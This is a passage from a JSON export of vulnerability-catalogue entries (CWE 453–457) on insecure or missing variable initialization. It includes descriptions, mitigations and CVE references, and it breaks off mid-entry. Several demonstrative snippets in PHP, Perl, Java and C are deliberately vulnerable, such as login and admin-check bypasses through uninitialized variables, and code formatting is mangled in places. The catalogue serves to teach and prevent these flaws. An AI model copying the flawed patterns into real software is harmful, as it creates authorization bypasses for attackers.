{
  "Weaknesses": [
    {
      "ID": "453",
      "Name": "Insecure Default Variable Initialization",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product, by default, initializes an internal variable with an insecure or less secure value than is possible.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1188",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "PHP",
          "Prevalence": "Sometimes"
        },
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data"
          ],
          "Note": "An attacker could gain access to and modify sensitive data or system information."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "System Configuration"
          ],
          "Description": "Disable or change default settings when they can be used to abuse the system. Since those default settings are shipped with the product they are likely to be known by a potential attacker who is familiar with the product. For instance, default credentials should be changed or the associated accounts should be disabled."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-163",
          "Entries": [
            {
              "IntroText": "This code attempts to login a user using credentials from a POST request:"
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n```\n// $user and $pass automatically set from POST request* \n\tif (login_user($user,$pass)) {\n\t```\n\t\t$authorized = true;\n\t}\n```\n...* \n\t\n\tif ($authorized) {\n\t```\n\t\tgeneratePage();\n\t}\n```"
            },
            {
              "BodyText": "Because the $authorized variable is never initialized, PHP will automatically set $authorized to any value included in the POST request if register_globals is enabled. An attacker can send a POST request with an unexpected third value 'authorized' set to 'true' and gain authorized status without supplying valid credentials."
            },
            {
              "BodyText": "Here is a fixed version:"
            },
            {
              "Nature": "Good",
              "Language": "PHP",
              "ExampleCode": "```\n\t$user = $_POST['user'];\n\t$pass = $_POST['pass'];\n\t$authorized = false;\n\tif (login_user($user,$pass)) {\n\t\t$authorized = true;\n\t}\n```\n...*"
            },
            {
              "BodyText": "This code avoids the issue by initializing the $authorized variable to false and explicitly retrieving the login credentials from the $_POST variable. Regardless, register_globals should never be enabled and is disabled by default in current versions of PHP."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-36349",
          "Description": "insecure default variable initialization in BIOS firmware for a hardware board allows DoS",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-36349"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "PLOVER",
          "EntryName": "Insecure default variable initialization"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "This overlaps other categories, probably should be split into separate items."
        }
      ]
    },
    {
      "ID": "454",
      "Name": "External Initialization of Trusted Variables or Data Stores",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product initializes critical internal variables or data stores using inputs that can be modified by untrusted actors.",
      "ExtendedDescription": "A product system should be reluctant to trust variables that have been initialized outside of its trust boundary, especially if they are initialized by users. The variables may have been initialized incorrectly. If an attacker can initialize the variable, then they can influence what the vulnerable system will do.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1419",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanAlsoBe",
          "CweID": "456",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "PHP",
          "Prevalence": "Sometimes"
        },
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data"
          ],
          "Note": "An attacker could gain access to and modify sensitive data or system information."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Input Validation",
          "Description": "A product system should be reluctant to trust variables that have been initialized outside of its trust boundary. Ensure adequate checking (e.g. input validation) is performed when relying on input from outside a trust boundary."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Avoid any external control of variables. If necessary, restrict the variables that can be modified using an allowlist, and use a different namespace or naming convention if possible."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In the Java example below, a system property controls the debug level of the application."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tint debugLevel = Integer.getInteger(\"com.domain.application.debugLevel\").intValue();\n```"
            },
            {
              "BodyText": "If an attacker is able to modify the system property, then it may be possible to coax the application into divulging sensitive information by virtue of the fact that additional debug information is printed/exposed as the debug level increases."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "This code checks the HTTP POST request for a debug switch, and enables a debug mode if the switch is set."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\t$debugEnabled = false;\n\tif ($_POST[\"debug\"] == \"true\"){\n\t\t$debugEnabled = true;\n\t}\n```\n/.../* \n\t\n\tfunction login($username, $password){\n\t```\n\t\tif($debugEnabled){\n\t\t\techo 'Debug Activated';\n\t\t\tphpinfo();\n\t\t\t$isAdmin = True;\n\t\t\treturn True;\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "Any user can activate the debug mode, gaining administrator privileges. An attacker may also use the information printed by the phpinfo() function to further exploit the system. ."
            },
            {
              "BodyText": "This example also exhibits Information Exposure Through Debug Information (CWE-215)"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-43468",
          "Description": "WordPress module sets internal variables based on external inputs, allowing false reporting of the number of views",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-43468"
        },
        {
          "Reference": "CVE-2000-0959",
          "Description": "Does not clear dangerous environment variables, enabling symlink attack.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0959"
        },
        {
          "Reference": "CVE-2001-0033",
          "Description": "Specify alternate configuration directory in environment variable, enabling untrusted path.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2001-0033"
        },
        {
          "Reference": "CVE-2001-0872",
          "Description": "Dangerous environment variable not cleansed.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2001-0872"
        },
        {
          "Reference": "CVE-2001-0084",
          "Description": "Specify arbitrary modules using environment variable.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2001-0084"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "PLOVER",
          "EntryName": "External initialization of trusted variables or values"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP25",
          "EntryName": "Tainted input to variable"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "Overlaps Missing variable initialization, especially in PHP."
        },
        {
          "Type": "Applicable Platform",
          "Note": "\n\nThis is often found in PHP due to register_globals and the common practice of storing library/include files under the web document root so that they are available using a direct request.\n"
        }
      ]
    },
    {
      "ID": "455",
      "Name": "Non-exit on Failed Initialization",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not exit or otherwise modify its operation when security-relevant errors occur during initialization, such as when a configuration file has a format error or a hardware security module (HSM) cannot be activated, which can cause the product to execute in a less secure fashion than intended by the administrator.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "665",
          "ViewID": "1000"
        },
        {
          "Nature": "ChildOf",
          "CweID": "705",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "636",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Other"
          ],
          "Impact": [
            "Modify Application Data",
            "Alter Execution Logic"
          ],
          "Note": "The application could be placed in an insecure state that may allow an attacker to modify sensitive data or allow unintended logic to be executed."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Follow the principle of failing securely when an error occurs. The system should enter a state where it is not vulnerable and will not display sensitive error messages to a potential attacker."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-54",
          "Entries": [
            {
              "IntroText": "The following code intends to limit certain operations to the administrator only."
            },
            {
              "Nature": "Bad",
              "Language": "Perl",
              "ExampleCode": "```\n\t$username = GetCurrentUser();\n\t$state = GetStateData($username);\n\tif (defined($state)) {\n\t\t$uid = ExtractUserID($state);\n\t}\n```\n# do stuff* \n\tif ($uid == 0) {\n\t```\n\t\tDoAdminThings();\n\t}\n```"
            },
            {
              "BodyText": "If the application is unable to extract the state information - say, due to a database timeout - then the $uid variable will not be explicitly set by the programmer. This will cause $uid to be regarded as equivalent to \"0\" in the conditional, allowing the original user to perform administrator actions. Even if the attacker cannot directly influence the state data, unexpected errors could cause incorrect privileges to be assigned to a user just by accident."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2005-1345",
          "Description": "Product does not trigger a fatal error if missing or invalid ACLs are in a configuration file.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1345"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "PLOVER",
          "EntryName": "Non-exit on Failed Initialization"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Research Gap",
          "Note": "Under-studied. These issues are not frequently reported, and it is difficult to find published examples."
        }
      ]
    },
    {
      "ID": "456",
      "Name": "Missing Initialization of a Variable",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not initialize critical variables, which causes the execution environment to use unexpected values.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "909",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "665",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "665",
          "ViewID": "1340",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "89",
          "ViewID": "1000"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "120",
          "ViewID": "1000"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "98",
          "ViewID": "1000"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "457",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Other"
          ],
          "Impact": [
            "Unexpected State",
            "Quality Degradation",
            "Varies by Context"
          ],
          "Note": "The uninitialized data may be invalid, causing logic errors within the program. In some cases, this could result in a security problem."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Check that critical variables are initialized."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Use a static analysis tool to spot non-initialized variables."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "This function attempts to extract a pair of numbers from a user-supplied string."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid parse_data(char *untrusted_input){\n\t\t\tint m, n, error;\n\t\t\terror = sscanf(untrusted_input, \"%d:%d\", &m, &n);\n\t\t\tif ( EOF == error ){\n\t\t\t\tdie(\"Did not specify integer value. Die evil hacker!\\n\");\n\t\t\t}\n```\n/* proceed assuming n and m are initialized correctly */* \n\t\t\t}"
            },
            {
              "BodyText": "This code attempts to extract two integer values out of a formatted, user-supplied input. However, if an attacker were to provide an input of the form:"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\t123:\n```"
            },
            {
              "BodyText": "then only the m variable will be initialized. Subsequent use of n may result in the use of an uninitialized variable (CWE-457)."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "Here, an uninitialized field in a Java class is used in a seldom-called method, which would cause a NullPointerException to be thrown."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tprivate User user;\n\tpublic void someMethod() {\n```\n// Do something interesting.* \n\t\t\t...\n\t\t\t\n\t\t\t\n\t\t\t *// Throws NPE if user hasn't been properly initialized.* \n\t\t\tString username = user.getName();}"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "This code first authenticates a user, then allows a delete command if the user is an administrator."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\tif (authenticate($username,$password) && setAdmin($username)){\n\t\t$isAdmin = true;\n\t}\n```\n/.../* \n\t\n\tif ($isAdmin){\n\t```\n\t\tdeleteUser($userToDelete);\n\t}\n```"
            },
            {
              "BodyText": "The $isAdmin variable is set to true if the user is an admin, but is uninitialized otherwise. If PHP's register_globals feature is enabled, an attacker can set uninitialized variables like $isAdmin to arbitrary values, in this case gaining administrator privileges by setting $isAdmin to true."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In the following Java code the BankManager class uses the user variable of the class User to allow authorized users to perform bank manager tasks. The user variable is initialized within the method setUser that retrieves the User from the User database. The user is then authenticated as unauthorized user through the method authenticateUser."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class BankManager {\n```\n// user allowed to perform bank manager tasks* \n\t\t\tprivate User user = null;\n\t\t\tprivate boolean isUserAuthentic = false;\n\t\t\t\n\t\t\t\n\t\t\t *// constructor for BankManager class* \n\t\t\tpublic BankManager() {\n\t\t\t```\n\t\t\t\t...\n\t\t\t}\n```\n// retrieve user from database of users* \n\t\t\tpublic User getUserFromUserDatabase(String username){\n\t\t\t```\n\t\t\t\t...\n\t\t\t}\n```\n// set user variable using username* \n\t\t\tpublic void setUser(String username) {\n\t\t\t```\n\t\t\t\tthis.user = getUserFromUserDatabase(username);\n\t\t\t}\n```\n// authenticate user* \n\t\t\tpublic boolean authenticateUser(String username, String password) {\n\t\t\t```\n\t\t\t\tif (username.equals(user.getUsername()) && password.equals(user.getPassword())) {\n\t\t\t\t\tisUserAuthentic = true;\n\t\t\t\t}\n\t\t\t\treturn isUserAuthentic;\n\t\t\t}\n```\n// methods for performing bank manager tasks* \n\t\t\t...}"
            },
            {
              "BodyText": "However, if the method setUser is not called before authenticateUser then the user variable will not have been initialized and will result in a NullPointerException. The code should verify that the user variable has been initialized before it is used, as in the following code."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class BankManager {\n```\n// user allowed to perform bank manager tasks* \n\t\t\tprivate User user = null;\n\t\t\tprivate boolean isUserAuthentic = false;\n\t\t\t\n\t\t\t\n\t\t\t *// constructor for BankManager class* \n\t\t\tpublic BankManager(String username) {\n\t\t\t```\n\t\t\t\tuser = getUserFromUserDatabase(username);\n\t\t\t}\n```\n// retrieve user from database of users* \n\t\t\tpublic User getUserFromUserDatabase(String username) {...}\n\t\t\t\n\t\t\t\n\t\t\t *// authenticate user* \n\t\t\tpublic boolean authenticateUser(String username, String password) {\n\t\t\t```\n\t\t\t\t\tif (user == null) {\n\t\t\t\t\t\tSystem.out.println(\"Cannot find user \" + username);\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tif (password.equals(user.getPassword())) {\n\t\t\t\t\t\t\tisUserAuthentic = true;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\treturn isUserAuthentic;\n\t\t\t}\n```\n// methods for performing bank manager tasks* \n\t\t\t\t\t...\n\t\t\t}"
            }
          ]
        },
        {
          "ID": "DX-144",
          "Entries": [
            {
              "IntroText": "This example will leave test_string in an unknown condition when i is the same value as err_val, because test_string is not initialized (CWE-456). Depending on where this code segment appears (e.g. within a function body), test_string might be random if it is stored on the heap or stack. If the variable is declared in static memory, it might be zero or NULL. Compiler optimization might contribute to the unpredictability of this address."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "char *test_string;\n if (i != err_val)\n {\n\n```\n\ttest_string = \"Hello World!\";\n }\n printf(\"%s\", test_string);\n```"
            },
            {
              "BodyText": "When the printf() is reached, test_string might be an unexpected address, so the printf might print junk strings (CWE-457).\n\n\n To fix this code, there are a couple approaches to making sure that test_string has been properly set once it reaches the printf().\n\n\nOne solution would be to set test_string to an acceptable default before the conditional:"
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "char *test_string = \"Done at the beginning\";\n if (i != err_val)\n {\n\n```\n\ttest_string = \"Hello World!\";\n }\n printf(\"%s\", test_string);\n```"
            },
            {
              "BodyText": "Another solution is to ensure that each branch of the conditional - including the default/else branch - could ensure that test_string is set:"
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "char *test_string;\n if (i != err_val)\n {\n\n```\n\ttest_string = \"Hello World!\";\n }\n else {\n\ttest_string = \"Done on the other side!\";\n }\n printf(\"%s\", test_string);\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2020-6078",
          "Description": "Chain: The return value of a function returning a pointer is not checked for success (CWE-252) resulting in the later use of an uninitialized variable (CWE-456) and a null pointer dereference (CWE-476)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2020-6078"
        },
        {
          "Reference": "CVE-2009-2692",
          "Description": "Chain: Use of an unimplemented network socket operation pointing to an uninitialized handler function (CWE-456) causes a crash because of a null pointer dereference (CWE-476).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2692"
        },
        {
          "Reference": "CVE-2020-20739",
          "Description": "A variable that has its value set in a conditional statement is sometimes used when the conditional fails, sometimes causing data leakage",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2020-20739"
        },
        {
          "Reference": "CVE-2005-2978",
          "Description": "Product uses uninitialized variables for size and index, leading to resultant buffer overflow.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2978"
        },
        {
          "Reference": "CVE-2005-2109",
          "Description": "Internal variable in PHP application is not initialized, allowing external modification.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2109"
        },
        {
          "Reference": "CVE-2005-2193",
          "Description": "Array variable not initialized in PHP application, leading to resultant SQL injection.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2193"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "PLOVER",
          "EntryName": "Missing Initialization"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP1",
          "EntryName": "Glitch in computation"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "ERR30-C",
          "EntryName": "Set errno to zero before calling a library function known to set errno,  and check errno only after the function returns a value indicating failure",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "SEI CERT Perl Coding Standard",
          "EntryID": "DCL04-PL",
          "EntryName": "Always initialize local variables",
          "MappingFit": "Exact"
        },
        {
          "TaxonomyName": "SEI CERT Perl Coding Standard",
          "EntryID": "DCL33-PL",
          "EntryName": "Declare identifiers before using them",
          "MappingFit": "Imprecise"
        },
        {
          "TaxonomyName": "OMG ASCSM",
          "EntryID": "ASCSM-CWE-456"
        },
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-CWE-456"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 7, \"Variable Initialization\", Page 312",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        },
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-CWE-456",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        },
        {
          "ExternalReferenceID": "REF-962",
          "Section": "ASCSM-CWE-456",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Security Measure (ASCSM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCSM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "This weakness is a major factor in a number of resultant weaknesses, especially in web applications that allow global variable initialization (such as PHP) with libraries that can be directly requested."
        },
        {
          "Type": "Research Gap",
          "Note": "It is highly likely that a large number of resultant weaknesses have missing initialization as a primary factor, but researcher reports generally do not provide this level of detail."
        }
      ]
    },
    {
      "ID": "457",
      "Name": "Use of Uninitialized Variable",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The code uses a variable that has not been initialized, leading to unpredictable or unintended results.",
      "ExtendedDescription": "In some languages such as C and C++, stack variables are not initialized by default. They generally contain junk data with the contents of stack memory before the function was invoked. An attacker can sometimes control or read these contents. In other languages or conditions, a variable that is not explicitly initialized can be given a default value that has security implications, depending on the logic of the program. The presence of an uninitialized variable can sometimes indicate a typographic error in the code.",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "908",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "665",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "665",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Sometimes"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Sometimes"
        },
        {
          "Type": "Language",
          "Name": "Perl",
          "Prevalence": "Often"
        },
        {
          "Type": "Language",
          "Name": "PHP",
          "Prevalence": "Often"
        },
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "In C, using an uninitialized char * in some string libraries will return incorrect results, as the libraries expect the null terminator to always be at the end of a string, even if the string is empty."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability",
            "Integrity",
            "Other"
          ],
          "Impact": [
            "Other"
          ],
          "Note": "Initial variables usually contain junk, which can not be trusted for consistency. This can lead to denial of service conditions, or modify control flow in unexpected ways. In some cases, an attacker can \"pre-initialize\" the variable using previous actions, which might enable code execution. This can cause a race condition if a lock variable check passes when it should not."
        },
        {
          "Scope": [
            "Authorization",
            "Other"
          ],
          "Impact": [
            "Other"
          ],
          "Note": "Strings that are not initialized are especially dangerous, since many functions expect a null at the end -- and only at the end -- of a string."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-13",
          "Method": "Fuzzing",
          "Description": "Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.",
          "Effectiveness": "High"
        },
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Attack Surface Reduction",
          "Description": "Assign all variables to an initial value."
        },
        {
          "Phase": [
            "Build and Compilation"
          ],
          "Strategy": "Compilation or Build Hardening",
          "Description": "Most compilers will complain about the use of uninitialized variables if warnings are turned on."
        },
        {
          "Phase": [
            "Implementation",
            "Operation"
          ],
          "Description": "When using a language that does not require explicit declaration of variables, run or compile the software in a mode that reports undeclared or unknown variables. This may indicate the presence of a typographic error in the variable's name."
        },
        {
          "Phase": [
            "Requirements"
          ],
          "Description": "The choice could be made to use a language that is not susceptible to these issues."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Mitigating technologies such as safe string libraries and container abstractions could be introduced."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "This code prints a greeting using information stored in a POST request:"
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\tif (isset($_POST['names'])) {\n\t\t$nameArray = $_POST['names'];\n\t}\n\techo \"Hello \" . $nameArray['first'];\n```"
            },
            {
              "BodyText": "This code checks if the POST array 'names' is set before assigning it to the $nameArray variable. However, if the array is not in the POST request, $nameArray will remain uninitialized. This will cause an error when the array is accessed to print the greeting message, which could lead to further exploit."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The following switch statement is intended to set the values of the variables aN and bN before they are used:"
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint aN, Bn;\n\tswitch (ctl) {\n\t\t\tcase -1:\n\t\t\t\taN = 0;\n\t\t\t\tbN = 0;\n\t\t\t\tbreak;\n\t\t\tcase 0:\n\t\t\t\taN = i;\n\t\t\t\tbN = -i;\n\t\t\t\tbreak;\n\t\t\tcase 1:\n\t\t\t\taN = i + NEXT_SZ;\n\t\t\t\tbN = i - NEXT_SZ;\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\taN = -1;\n\t\t\t\taN = -1;\n\t\t\t\tbreak;\n\t}\n\trepaint(aN, bN);\n```"
            },
            {
              "BodyText": "In the default case of the switch statement, the programmer has accidentally set the value of aN twice. As a result, bN will have an undefined value. Most uninitialized variable issues result in general software reliability problems, but if attackers can intentionally trigger the use of an uninitialized variable, they might be able to launch a denial of service attack by crashing the program. Under the right circumstances, an attacker may be able to control the value of an uninitialized variable by affecting the values on the stack prior to the invocation of the function."
            }
          ]
        },
        {
          "ID": "DX-144",
          "Entries": [
            {
              "IntroText": "This example will leave test_string in an unknown condition when i is the same value as err_val, because test_string is not initialized (CWE-456). Depending on where this code segment appears (e.g. within a function body), test_string might be random if it is stored on the heap or stack. If the variable is declared in static memory, it might be zero or NULL. Compiler optimization might contribute to the unpredictability of this address."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "char *test_string;\n if (i != err_val)\n {\n\n```\n\ttest_string = \"Hello World!\";\n }\n printf(\"%s\", test_string);\n```"
            },
            {
              "BodyText": "When the printf() is reached, test_string might be an unexpected address, so the printf might print junk strings (CWE-457).\n\n\n To fix this code, there are a couple approaches to making sure that test_string has been properly set once it reaches the printf().\n\n\nOne solution would be to set test_string to an acceptable default before the conditional:"
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "char *test_string = \"Done at the beginning\";\n if (i != err_val)\n {\n\n```\n\ttest_string = \"Hello World!\";\n }\n printf(\"%s\", test_string);\n```"
            },
            {
              "BodyText": "Another solution is to ensure that each branch of the conditional - including the default/else branch - could ensure that test_string is set:"
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "char *test_string;\n if (i != err_val)\n {\n\n```\n\ttest_string = \"Hello World!\";\n }\n else {\n\ttest_string = \"Done on the other side!\";\n }\n printf(\"%s\", test_string);\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2019-15900",
